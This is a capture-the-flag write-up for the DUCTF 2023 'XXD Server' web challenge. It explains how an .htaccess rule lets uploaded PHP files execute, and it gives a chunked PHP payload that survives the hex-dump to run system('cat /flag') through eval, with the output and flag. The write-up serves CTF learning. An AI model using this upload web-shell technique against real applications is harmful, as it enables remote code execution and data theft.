# XXD Server

## Description

I wrote a little app that allows you to hex dump files over the internet.

Author: hashkitten

Application: [https://web-xxd-server-2680de9c070f.2023.ductf.dev](https://web-xxd-server-2680de9c070f.2023.ductf.dev/)<br>
Downloads: [xxd_server.zip](https://play.duc.tf/files/950953e79216c551f9140175be7e40e8/xxd_server.zip?token=eyJ1c2VyX2lkIjoyNDI4LCJ0ZWFtX2lkIjoxMjc1LCJmaWxlX2lkIjo4NH0.ZPRRpA.FSA5xv92AkYrA3DaBGoz17J8iDk)

## Analysis

The application allows you to upload files and view them as hexdump. 

There's interesting rule in `.htaccess`

```
# Everything not a PHP file, should be served as text/plain
<FilesMatch "\.(?!(php)$)([^.]*)$">
    ForceType text/plain
</FilesMatch>
```

So we are allowed to upload PHP scripts and get RCE. But there's limitation: 
```php
if (isset($_FILES['file-upload'])) {
	$upload_dir = 'uploads/' . bin2hex(random_bytes(8));
	$upload_path = $upload_dir . '/' . basename($_FILES['file-upload']['name']);
	mkdir($upload_dir);
	$upload_contents = xxd(file_get_contents($_FILES['file-upload']['tmp_name']));
	if (file_put_contents($upload_path, $upload_contents)) {
		$message = 'Your file has been uploaded. Click <a href="' . htmlspecialchars($upload_path) . '">here</a> to view';
	} else {
	    $message = 'File upload failed.';
	}
}
```

When we upload file it's placed into random folder, contents is converted to hexdump and served. If we upload php script it's not going to work due to hexdump. We still can get RCE, but we are limited to 16 characters due to hexdump. 

If you try to uplaod file with contents `<?= phpinfo() ?>` (16 characters), you'll get phpinfo page, this means we need to build payload using only 16 character per line.

[xxd-server-1](/assets/ductf/2023/xxd-server-1.png)

### Solution

```php
# echo system('cat /flag')
<?php $a="ech"?>
<?php $b="o s"?>
<?php $c="yst"?>
<?php $d="em("?>
<?php $e="'ca"?>
<?php $g="t /"?>
<?php $h="fla"?>
<?php $i="g')"?>
<?php $j=";  "?> <!-- Payload chunks -->
<?php $p=$a.$b?> <!-- Concatinate payload -->
<?php $p.=$c  ?>
<?php $p.=$d  ?>
<?php $p.=$e  ?>
<?php $p.=$g  ?>
<?php $p.=$h  ?>
<?php $p.=$i  ?>
<?php $p.=$j  ?>
<?php eval($p)?> <!-- Execute payload -->
```

Remove newlines:
```php
<?php  $a="ech"?><?php  $b="o s"?><?php  $c="yst"?><?php  $d="em("?><?php  $e="'ca"?><?php  $g="t /"?><?php  $h="fla"?><?php  $i="g')"?><?php  $j="; "?><?php  $p=$a.$b?><?php  $p.=$c  ?><?php  $p.=$d  ?><?php  $p.=$e  ?><?php  $p.=$g  ?><?php  $p.=$h  ?><?php  $p.=$i  ?><?php  $p.=$j  ?><?php  eval($p)?>
```

Output:
```
00000000: 3c3f 7068 7020 2461 3d22 6563 6822 3f3e 00000010: 3c3f 7068 7020 2462 3d22 6f20 7322 3f3e 00000020: 3c3f 7068 7020 2463 3d22 7973 7422 3f3e 00000030: 3c3f 7068 7020 2464 3d22 656d 2822 3f3e 00000040: 3c3f 7068 7020 2465 3d22 2763 6122 3f3e 00000050: 3c3f 7068 7020 2467 3d22 7420 2f22 3f3e 00000060: 3c3f 7068 7020 2468 3d22 666c 6122 3f3e 00000070: 3c3f 7068 7020 2469 3d22 6727 2922 3f3e 00000080: 3c3f 7068 7020 246a 3d22 3b20 2022 3f3e 00000090: 3c3f 7068 7020 2470 3d24 612e 2462 3f3e 000000a0: 3c3f 7068 7020 2470 2e3d 2463 2020 3f3e 000000b0: 3c3f 7068 7020 2470 2e3d 2464 2020 3f3e 000000c0: 3c3f 7068 7020 2470 2e3d 2465 2020 3f3e 000000d0: 3c3f 7068 7020 2470 2e3d 2467 2020 3f3e 000000e0: 3c3f 7068 7020 2470 2e3d 2468 2020 3f3e 000000f0: 3c3f 7068 7020 2470 2e3d 2469 2020 3f3e 00000100: 3c3f 7068 7020 2470 2e3d 246a 2020 3f3e 00000110: 3c3f 7068 7020 6576 616c 2824 7029 3f3e DUCTF{00000000__7368_656c_6c64_5f77_6974_685f_7878_6421__shelld_with_xxd!}DUCTF{00000000__7368_656c_6c64_5f77_6974_685f_7878_6421__shelld_with_xxd!}00000120: 0a .
```
::: tip Flag
`DUCTF{00000000__7368_656c_6c64_5f77_6974_685f_7878_6421__shelld_with_xxd!}`
:::